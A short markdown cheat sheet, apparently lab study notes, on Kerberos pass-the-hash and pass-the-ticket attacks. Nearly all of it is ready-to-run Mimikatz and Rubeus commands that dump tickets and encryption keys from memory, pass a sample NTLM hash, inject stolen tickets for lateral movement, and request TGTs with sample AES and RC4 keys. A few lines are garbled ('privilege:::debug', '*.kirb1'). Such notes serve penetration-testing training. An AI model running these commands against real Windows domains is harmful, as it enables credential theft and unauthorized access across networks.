# Kerberos Protocol Refresher
* Ticket Granting Ticket (TGT)
* Ticket Granting Service (TGS)

User requests a TGT they must authenticate to the Domain Server with a time stamp to their hash.

### Using Mimikatz and Rubeus
```bash
Mimikatz.exe
privilege:::debug
sekurlsa::tickets /export

# Exports is a *.kirb1
```

```bash
Rubeus.exe dump /nowrap
```

Note: if one wants to collect all the tickets one needs to be administrator for that.

### Extracting Kerberos Keys
```bash
mimikatz.exe
privilege::debug
sekurlsa::ekeys

# After getting the hash
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f

# Passing the Ticket
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"

# Lateral Movement is the Windows machine
kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
```

```bash
# Rubeus way of doing it
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap

# Passing the ticket
 Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
 Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
 
# Converting the ticket to a base64 format (Windows)
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```
